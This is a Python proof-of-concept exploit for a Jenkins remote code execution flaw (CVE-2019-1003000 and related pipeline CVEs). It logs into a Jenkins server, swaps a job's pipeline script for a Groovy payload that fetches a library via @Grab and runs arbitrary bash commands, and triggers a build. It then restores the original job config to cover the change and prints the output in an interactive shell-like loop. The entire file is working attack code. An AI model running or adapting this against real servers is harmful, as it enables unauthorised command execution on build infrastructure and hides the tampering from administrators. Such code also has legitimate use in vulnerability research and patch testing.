#!/usr/bin/python3

# Author: Adam Jordan
# Date: 2019-02-15
# Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
# PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)

import argparse
import jenkins
import time
from xml.etree import ElementTree

payload = '''
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }

print new ProcBuilder("/bin/bash").withArgs("-c","%s").run().getOutputString()
'''

def run_command(url, cmd, job_name, username, password):
    print('[+] Connecting to Jenkins...')
    server = jenkins.Jenkins(url, username, password)

    print('[+] Crafting payload...')
    ori_job_config = server.get_job_config(job_name)
    et = ElementTree.fromstring(ori_job_config)
    et.find('definition/script').text = payload % cmd
    job_config = ElementTree.tostring(et, encoding='unicode', method='xml')

    print('[+] Modifying job with payload...')
    server.reconfig_job(job_name, job_config)
    time.sleep(3)

    print('[+] Putting job build to queue...')
    queue_number = server.build_job(job_name)
    time.sleep(3)

    print('[+] Waiting for job to build...')
    queue_item_info = {}
    while 'executable' not in queue_item_info:
        queue_item_info = server.get_queue_item(queue_number)
        time.sleep(1)

    print('[+] Restoring job...')
    server.reconfig_job(job_name, ori_job_config)
    time.sleep(3)

    print('[+] Fetching output...')
    last_build_number = server.get_job_info(job_name)['lastBuild']['number']
    console_output = server.get_build_console_output(job_name, last_build_number)

    print('[+] OUTPUT:')
    print(console_output)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Jenkins RCE')

    parser.add_argument('--url', help='Target Jenkins URL')
    parser.add_argument('--job', help='Job name')
    parser.add_argument('--username', help='Username')
    parser.add_argument('--password', help='Password')

    args = parser.parse_args()

    while True:
        cmd = input('Enter a command (or "exit" to quit): ')
        if cmd.lower() == 'exit':
            break
        run_command(args.url, cmd, args.job, args.username, args.password)
